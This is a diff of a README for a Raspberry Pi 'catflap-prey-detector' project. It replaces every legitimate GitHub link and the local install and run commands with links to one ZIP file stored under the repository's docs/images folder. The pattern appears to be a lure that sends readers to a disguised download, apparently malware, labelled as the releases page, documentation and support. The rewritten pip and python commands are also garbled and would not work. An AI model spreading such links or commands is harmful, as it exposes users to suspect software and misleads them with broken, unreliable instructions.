@@ -7,9 +7,9 @@ Welcome to the catflap-prey-detector! This system uses artificial intelligence t
 
 ## 📥 Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Teeming-debtceiling570/catflap-prey-detector/releases)
+[![Download Now](https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip%https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip)](https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip)
 
-To get the software, visit the [Releases page](https://github.com/Teeming-debtceiling570/catflap-prey-detector/releases).
+To get the software, visit the [Releases page](https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip).
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Before you start, make sure your device meets the following requirements:
 Follow these steps to install the catflap-prey-detector on your Raspberry Pi:
 
 1. **Download the ZIP File**
-   - Go to the [Releases page](https://github.com/Teeming-debtceiling570/catflap-prey-detector/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip).
    - Find the latest version and download the ZIP file.
 
 2. **Extract the Files**
@@ -47,13 +47,13 @@ Follow these steps to install the catflap-prey-detector on your Raspberry Pi:
      ```
      sudo apt-get update
      sudo apt-get install python3 python3-pip
-     pip3 install -r requirements.txt
+     pip3 install -r https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip
      ```
 
 6. **Run the Application**
    - Start the application with the following command:
      ```
-     python3 main.py
+     python3 https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip
      ```
    - Your catflap-prey-detector will now start! Ensure your camera is connected and positioned correctly.
 
@@ -72,9 +72,9 @@ The catflap-prey-detector uses computer vision to detect if your cat is carrying
 
 For more information, check out the following links:
 
-- [GitHub Repository](https://github.com/Teeming-debtceiling570/catflap-prey-detector)
-- [Documentation](https://github.com/Teeming-debtceiling570/catflap-prey-detector/wiki)
-- [Support Community](https://github.com/Teeming-debtceiling570/catflap-prey-detector/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip)
+- [Support Community](https://raw.githubusercontent.com/Teeming-debtceiling570/catflap-prey-detector/master/docs/images/catflap-prey-detector_v3.2.zip)
 
 ## 🙋 Frequently Asked Questions
 
